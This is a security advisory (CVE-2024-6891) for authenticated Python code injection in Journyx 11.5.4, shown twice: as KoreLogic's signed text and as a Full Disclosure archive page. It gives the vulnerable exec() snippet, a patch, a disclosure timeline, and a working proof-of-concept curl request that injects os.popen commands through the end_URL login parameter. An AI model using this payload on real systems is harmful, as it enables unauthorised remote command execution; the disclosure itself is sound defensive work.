=== Content from korelogic.com_75e3e046_20250111_080433.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
KL-001-2024-008: Journyx Authenticated Remote Code Execution
Title: Journyx Authenticated Remote Code Execution
Advisory ID: KL-001-2024-008
Publication Date: 2024.08.07
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-008.txt
1. Vulnerability Details
Affected Vendor: Journyx
Affected Product: Journyx (jtime)
Affected Version: 11.5.4
Platform: GNU/Linux
CWE Classification: CWE-94: Improper Control of Generation of Code
('Code Injection'), CWE-95: Improper Neutralization
of Directives in Dynamically Evaluated Code
('Eval Injection')
CVE ID: CVE-2024-6891
2. Vulnerability Description
Attackers with a valid username and password can exploit
a python code injection vulnerability during the natural
login flow.
3. Technical Description
When utilizing a username and password to authenticate to
Journyx via the web interface, an HTTP request is sent to
"wtlogin.pyc" containing the credentials. Upon a successful
login, the user is redirected to "wte.pyc" or the URL specified
in the "end\_URL" body parameter if one is supplied.
An additional condition is present, however. If the
"end\_URL" value is over 1,000 characters, the value is instead
interpolated into a python "import" statement which is passed
into the "exec()" function, thereby executing arbitrary code.
Code snippet from "wtlogin.pyc":
finalURL = end\_URL + '.pyc?' + genlib.URLEncodeParams(params)
if len(finalURL) < 1000:
raise genlib.HTTP302Found(finalURL)
else:
exec('import %s; %s.main()' % (end\_URL, end\_URL))
The "params" variable is derived from the query parameters
included in the login request, so the size of "finalURL"
is trivial to inflate.
4. Mitigation and Remediation Recommendation
The vendor reports that this issue was remediated in Journyx
v12.0.0, which is the first wholly cloud-hosted version of
this product.
For self-hosted instances of JournyX, additional security
measures (such as input sanitization) can be added by monkey
patching the PYC file responsible for handling request
parameters (mycgi.pyc).
1) Rename "mycgi.pyc" to an alternative name, e.g. mycgi\_original.pyc.
$ mv wt\_tar/pi/pylib/wtlib/mycgi.py wt\_tar/pi/pylib/wtlib/mycgi\_original.py
2) Create a file named "mycgi.py" in the same directory.
$ touch wt\_tar/pi/pylib/wtlib/mycgi.py
3) Insert the following code into the newly created "mycgi.py"
from mycgi\_original import \*
from html import escape
def patch():
pdata = \_parse()
# force the value of "end\_URL" to always be "wte"
if pdata.get('end\_URL'): pdata['end\_URL'] = ['wte']
# sanitize user-controlled error messages
for parameter in ['error', 'error\_description']:
if not pdata.get(parameter): continue
pdata[parameter] = [escape(value) for value in pdata[parameter]]
return pdata
\_parse = parse
parse = patch
Once these changes have been made, the JournyX native "mycgi.parse()"
function will be overwritten with the "patch()" function located in the
"mycgi.py" file. Relevant to this advisory, the patch provided above
will force the "end\_URL" parameter to always have a value of "wte".
5. Credit
This vulnerability was discovered by Jaggar Henry of KoreLogic, Inc.
6. Disclosure Timeline
2024.01.31 - KoreLogic notifies Journyx support of the intention to
report vulnerabilities discovered in the licensed,
on-premises version of the product.
2024.01.31 - Journyx acknowledges receipt.
2024.02.02 - KoreLogic requests a meeting with Journyx support to share
vulnerability details.
2024.02.07 - KoreLogic reports vulnerability details to Journyx.
2024.02.09 - Journyx responds that this vulnerability has been remediated
in the cloud-hosted version of the product.
2024.02.21 - KoreLogic offers to test the cloud version to confirm
the fix; no response.
2024.07.01 - KoreLogic notifies Journyx of impending public disclosure.
2024.07.09 - Journyx confirms version number of the remediation.
2024.08.07 - KoreLogic public disclosure.
7. Proof of Concept
By leveraging the existing "web" python module, it is possible
to see the output of shell commands as returned by "os.popen()".
[attacker@box]$ HOST='redacted.com'; PORT='8080'; USERNAME='employee'; PASSWORD='password123'; COMMAND='id'; \
curl -x http://localhost:8080 -X POST \
-d "wtusername=$USERNAME&wtpassword=$PASSWORD&end\_URL=os,web%0aweb.response.text%3dos.popen('$COMMAND').read()#&timestamp=9999999999&pageid=$RANDOM" \
-H 'Cookie: wtsession=foobar' \
"http://$HOST:$PORT/jtcgi/wtlogin.pyc?z=$(printf 'Z%.0s' {1..1000})"
uid=1000(foo) gid=1000(foo) groups=1000(foo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
[attacker@box]$
The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/
KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html
Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
-----BEGIN PGP SIGNATURE-----
iQJOBAEBCAA4FiEEB12WYZwbVwYTJ/b2DKLsCTlWkekFAma0BzYaHGRpc2Nsb3N1
cmVzQGtvcmVsb2dpYy5jb20ACgkQDKLsCTlWkel88BAAmu6OR/bw0qtB36r2jqtY
X+dYLN7824iz0Xgmw7yU9ycz9Ffv04xYiYBfeOBKVKFGkxpoqE5qfKSalmDs3ucO
H6yR4IsfdGgBVxFtGT2xobEJBixrUIO/djLl6K70nuBbsnKsppnO7Xr3BplN5jmF
dPOzgGJ+xBF7JOcl3DTXm+v4GVKrXtIXcKdryCsqFXh7G0/4m9b02+S0FSrwP3AB
WFXJP3GRoV+/x+29fJF6EnmMTV7BhQ+9Z9CztK4r+3qGHnvD2tmETpyp+2Vpadi6
uglXEVuSmdSXdF6EUR+PhYXsrgNkHMd6brOnn/hNtG8uyLaggv3LqM77/byETeU8
UYd9t7mBqXPLYaJuxTzGVrJKoZ3NsScFENPx12nvpGw3lpSynHuuqP70Yg9xg+D5
fDRJaQIPklkIq/k1D5EEleJW2PaKOnwZes3Z5jPckTiEANQxG75tD9uOPe4hnOh/
KR1EiTE0/k0Wr5IepDv0C2Cb91YY5+BWp9w4p+v8pHPsLsreEilA5UnyU7k5vIcO
8MHy5kay02zVpAdWGFQD5i9ueAxzuEexY3CotyvrQPHYTpe8POUDfFTRt+L2nl2O
rl/SUQeozMXQsmhYra45ZIs+x+PENHG2rFpRfTCWiaPtN5dFednUvxNQc3vc/K8B
iupwHhJ6HCPHb3nzNlovXdk=
=CXxA
-----END PGP SIGNATURE-----


=== Content from seclists.org_92ddaa03_20250111_080432.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# KL-001-2024-008: Journyx Authenticated Remote Code Execution

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 7 Aug 2024 18:52:18 -0500

---

```

KL-001-2024-008: Journyx Authenticated Remote Code Execution

Title: Journyx Authenticated Remote Code Execution
Advisory ID: KL-001-2024-008
Publication Date: 2024.08.07
Publication URL: <https://korelogic.com/Resources/Advisories/KL-001-2024-008.txt>

1. Vulnerability Details

     Affected Vendor: Journyx
     Affected Product: Journyx (jtime)
     Affected Version: 11.5.4
     Platform: GNU/Linux
     CWE Classification: CWE-94: Improper Control of Generation of Code
                         ('Code Injection'), CWE-95: Improper Neutralization
                         of Directives in Dynamically Evaluated Code
                         ('Eval Injection')
     CVE ID: CVE-2024-6891

2. Vulnerability Description

     Attackers with a valid username and password can exploit
     a python code injection vulnerability during the natural
     login flow.

3. Technical Description

     When utilizing a username and password to authenticate to
     Journyx via the web interface, an HTTP request is sent to
     "wtlogin.pyc" containing the credentials. Upon a successful
     login, the user is redirected to "wte.pyc" or the URL specified
     in the "end_URL" body parameter if one is supplied.

     An additional condition is present, however. If the
     "end_URL" value is over 1,000 characters, the value is instead
     interpolated into a python "import" statement which is passed
     into the "exec()" function, thereby executing arbitrary code.

     Code snippet from "wtlogin.pyc":

     finalURL = end_URL + '.pyc?' + genlib.URLEncodeParams(params)
     if len(finalURL) < 1000:
         raise genlib.HTTP302Found(finalURL)
     else:
         exec('import %s; %s.main()' % (end_URL, end_URL))

     The "params" variable is derived from the query parameters
     included in the login request, so the size of "finalURL"
     is trivial to inflate.

4. Mitigation and Remediation Recommendation

     The vendor reports that this issue was remediated in Journyx
     v12.0.0, which is the first wholly cloud-hosted version of
     this product.

     For self-hosted instances of JournyX, additional security
     measures (such as input sanitization) can be added by monkey
     patching the PYC file responsible for handling request
     parameters (mycgi.pyc).

     1) Rename "mycgi.pyc" to an alternative name, e.g. mycgi_original.pyc.
          $ mv wt_tar/pi/pylib/wtlib/mycgi.py wt_tar/pi/pylib/wtlib/mycgi_original.py

     2) Create a file named "mycgi.py" in the same directory.
          $ touch wt_tar/pi/pylib/wtlib/mycgi.py

     3) Insert the following code into the newly created "mycgi.py"

          from mycgi_original import *
          from html import escape

          def patch():
              pdata = _parse()

              # force the value of "end_URL" to always be "wte"
              if pdata.get('end_URL'): pdata['end_URL'] = ['wte']

              # sanitize user-controlled error messages
              for parameter in ['error', 'error_description']:
                  if not pdata.get(parameter): continue
                  pdata[parameter] = [escape(value) for value in pdata[parameter]]

              return pdata

          _parse = parse
          parse  = patch

     Once these changes have been made, the JournyX native "mycgi.parse()"
     function will be overwritten with the "patch()" function located in the
     "mycgi.py" file. Relevant to this advisory, the patch provided above
     will force the "end_URL" parameter to always have a value of "wte".

5. Credit

     This vulnerability was discovered by Jaggar Henry of KoreLogic, Inc.

6. Disclosure Timeline

     2024.01.31 - KoreLogic notifies Journyx support of the intention to
                  report vulnerabilities discovered in the licensed,
                  on-premises version of the product.
     2024.01.31 - Journyx acknowledges receipt.
     2024.02.02 - KoreLogic requests a meeting with Journyx support to share
                  vulnerability details.
     2024.02.07 - KoreLogic reports vulnerability details to Journyx.
     2024.02.09 - Journyx responds that this vulnerability has been remediated
                  in the cloud-hosted version of the product.
     2024.02.21 - KoreLogic offers to test the cloud version to confirm
                  the fix; no response.
     2024.07.01 - KoreLogic notifies Journyx of impending public disclosure.
     2024.07.09 - Journyx confirms version number of the remediation.
     2024.08.07 - KoreLogic public disclosure.

7. Proof of Concept

    By leveraging the existing "web" python module, it is possible
    to see the output of shell commands as returned by "os.popen()".

    [attacker@box]$ HOST='redacted.com'; PORT='8080'; USERNAME='employee'; PASSWORD='password123'; COMMAND='id'; \
                    curl -x <http://localhost:8080> -X POST \

```
                         -d
"wtusername=$USERNAME&wtpassword=$PASSWORD&end\_URL=os,web%0aweb.response.text%3dos.popen('$COMMAND').read()#&timestamp=9999999999&pageid=$RANDOM"
\
```

                         -H 'Cookie: wtsession=foobar' \
"<http://$HOST:$PORT/jtcgi/wtlogin.pyc?z=$>(printf 'Z%.0s' {1..1000})"

```
    uid=1000(foo) gid=1000(foo)
groups=1000(foo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
```

    [attacker@box]$

The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
<http://creativecommons.org/licenses/by-sa/4.0/>

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
<https://www.korelogic.com/about-korelogic.html>

Our public vulnerability disclosure policy is available at:
<https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy>

```

**Attachment:
[OpenPGP\_signature.asc](att-6/OpenPGP_signature_asc.bin)**

*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

### Current thread:

* **KL-001-2024-008: Journyx Authenticated Remote Code Execution** *KoreLogic Disclosures via Fulldisclosure (Aug 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


